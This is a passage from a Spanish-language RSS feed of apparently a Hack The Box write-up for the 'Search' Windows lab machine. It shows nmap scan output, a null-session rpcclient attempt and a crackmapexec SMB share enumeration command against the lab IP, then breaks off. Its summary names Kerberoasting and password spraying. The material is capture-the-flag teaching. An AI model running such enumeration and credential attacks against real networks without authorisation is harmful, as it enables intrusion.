<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" 
  xmlns:content="http://purl.org/rss/1.0/modules/content/" 
  xmlns:dc="http://purl.org/dc/elements/1.1/" 
  xmlns:atom="http://www.w3.org/2005/Atom" 
  xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" 
  xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>crackmapexec on sckull</title>
    <link>https://sckull.github.io/tags/crackmapexec/</link>
    <description>Recent content in crackmapexec on sckull</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>es</language>
    <copyright>¬©{year}, All Rights Reserved</copyright>
    <lastBuildDate>Sat, 30 Apr 2022 00:00:00 +0000</lastBuildDate>
    <sy:updatePeriod>daily</sy:updatePeriod>
    <sy:updateFrequency>daily</sy:updateFrequency>
    
        <atom:link href="https://sckull.github.io/tags/crackmapexec/index.xml" rel="self" type="application/rss+xml" />
    
    
    

      
      <item>
        <title>Hack The Box - Search</title>
        <link>https://sckull.github.io/posts/search/</link>
        <pubDate>Sat, 30 Apr 2022 00:00:00 +0000</pubDate>
        
        <atom:modified>Sat, 30 Apr 2022 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/search/</guid>
        <description>Tras realizar una enumeraci√≥n de usuarios y encontrar credenciales en el sitio web realizamos Kerberoasting. Password Spraying nos dieron acceso a un siguiente usuario donde encontramos un archivo Excel con una lista de contrase√±as, una de ellas nos dio acceso por Powershell Web.</description>
        <content:encoded>



  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/htb/search/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;p&gt;Tras realizar una enumeraci√≥n de usuarios y encontrar credenciales en el sitio web realizamos Kerberoasting. Password Spraying nos dieron acceso a un siguiente usuario donde encontramos un archivo Excel con una lista de contrase√±as, una de ellas nos dio acceso por Powershell Web. Finalmente encontramos una ruta en Bloodhound para obtener acceso a un usuario del grupo Domain Admin para finalmente acceder como Administrador.&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Nombre&lt;/th&gt;
&lt;th align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.hackthebox.eu/home/machines/profile/422&#34;&gt;Search&lt;/a&gt; &lt;img src=&#34;data:image/png;base64,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&#34; alt=&#34;box_img_maker&#34; /&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;OS&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Windows&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Puntos&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;40&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Dificultad&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;Dificil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;IP&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;10.10.11.129&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;strong&gt;Maker&lt;/strong&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;span&gt;&lt;p class=&#34;user_maker&#34;&gt; &lt;a href=&#34;https://www.hackthebox.eu/home/users/profile/610173&#34;&gt;dmw0ng&lt;/a&gt;&lt;img src=&#34;https://www.hackthebox.eu/badge/image/610173&#34; class=&#34;img_user_maker&#34;/&gt;&lt;/p&gt;&lt;/span&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;
&lt;a href=&#34;#single__title&#34; class=&#34;button&#34; style=&#34;width: 72px; height: 30px; pointer-events: none;&#34;  data-color=&#34;default&#34; target=&#34;_blank&#34; rel=&#34;noreferrer&#34;&gt;
  &lt;span class=&#34;button__text&#34;&gt;
    Matrix
  &lt;/span&gt;
&lt;/a&gt;&lt;/td&gt;
&lt;td align=&#34;center&#34;&gt;&lt;div class=&#34;box&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-chart&#34; data-lang=&#34;chart&#34;&gt;{
   &amp;quot;type&amp;quot;:&amp;quot;radar&amp;quot;,
   &amp;quot;data&amp;quot;:{
      &amp;quot;labels&amp;quot;:[&amp;quot;Enumeration&amp;quot;,&amp;quot;Real-Life&amp;quot;,&amp;quot;CVE&amp;quot;,&amp;quot;Custom Explotation&amp;quot;,&amp;quot;CTF-Like&amp;quot;],
      &amp;quot;datasets&amp;quot;:[
         {
            &amp;quot;label&amp;quot;:&amp;quot;User Rate&amp;quot;,  &amp;quot;data&amp;quot;:[8, 7.4, 5.1, 4.9, 2.6],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(75, 162, 189,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#4ba2bd&amp;quot;
         },
         { 
            &amp;quot;label&amp;quot;:&amp;quot;Maker Rate&amp;quot;,
            &amp;quot;data&amp;quot;:[0, 0, 0, 0, 0],
            &amp;quot;backgroundColor&amp;quot;:&amp;quot;rgba(154, 204, 20,0.5)&amp;quot;,
            &amp;quot;borderColor&amp;quot;:&amp;quot;#9acc14&amp;quot;
         }
      ]
   },
    &amp;quot;options&amp;quot;: {&amp;quot;scale&amp;quot;: {&amp;quot;ticks&amp;quot;: {&amp;quot;backdropColor&amp;quot;:&amp;quot;rgba(0,0,0,0)&amp;quot;},
            &amp;quot;angleLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;},
            &amp;quot;gridLines&amp;quot;:{&amp;quot;color&amp;quot;:&amp;quot;rgba(255, 255, 255,0.6)&amp;quot;}
        }
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;h2 id=&#34;nmap&#34;&gt;nmap&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;nmap&lt;/code&gt; muestra multiples puertos abiertos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.91 scan initiated Fri Mar  4 22:59:35 2022 as: nmap -p53,80,88,135,139,389,443,445,464,593,3268,8172,9389,49666,49675,49676,49703,49714,49738 -sV -sC -oN nmap_scan 10.10.11.129&lt;/span&gt;
Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.11.129 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;10.10.11.129&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.37s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Search &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;mdash&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Just Testing IIS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;server time: 2022-03-04 22:59:40Z&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;research
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-08-11T08:13:35
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2030-08-09T08:13:35
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2022-03-04T23:01:13+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; -5s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; http-methods:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  Potentially risky methods: TRACE
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Search &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;mdash&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Just Testing IIS
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;research
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-08-11T08:13:35
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2030-08-09T08:13:35
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2022-03-04T23:01:13+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; -5s from scanner time.
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain: search.htb0., Site: Default-First-Site-Name&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;research
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-08-11T08:13:35
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2030-08-09T08:13:35
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2022-03-04T23:01:13+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; -8s from scanner time.
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: Microsoft-IIS/10.0
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Site doesn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t have a title.
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssl-cert: Subject: &lt;span class=&#34;nv&#34;&gt;commonName&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;WMSvc-SHA2-RESEARCH
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Not valid before: 2020-04-07T09:05:25
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_Not valid after:  2030-04-05T09:05:25
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_ssl-date: 2022-03-04T23:01:13+00:00&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; -5s from scanner time.
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tls-alpn:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  http/1.1
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open  msrpc         Microsoft Windows RPC
49703/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
49738/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Host script results:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_clock-skew: mean: -5s, deviation: 1s, median: -5s
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-security-mode:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   2.02:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_    Message signing enabled and required
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; smb2-time:
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   date: 2022-03-04T23:00:37
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
&lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Mar  4 23:01:22 2022 -- 1 IP address (1 host up) scanned in 106.92 seconds&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;rpc&#34;&gt;RPC&lt;/h2&gt;
&lt;p&gt;Una sesion nula por RPC no muestra informaci√≥n, es necesario autenticaci√≥n.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ rpcclient -U &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; -N 10.10.11.129
rpcclient $&amp;gt; enumdomusers
result was NT_STATUS_ACCESS_DENIED
rpcclient $&amp;gt; enumdomgroups
result was NT_STATUS_ACCESS_DENIED
rpcclient $&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;samba&#34;&gt;Samba&lt;/h2&gt;
&lt;p&gt;Al igual que rpc, &lt;code&gt;samba&lt;/code&gt; requiere de autenticaci√≥n para acceder a los recursos compartidos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; œÄ ~/htb/search ‚ùØ crackmapexec smb 10.10.11.129 -u &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -p &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; --shares
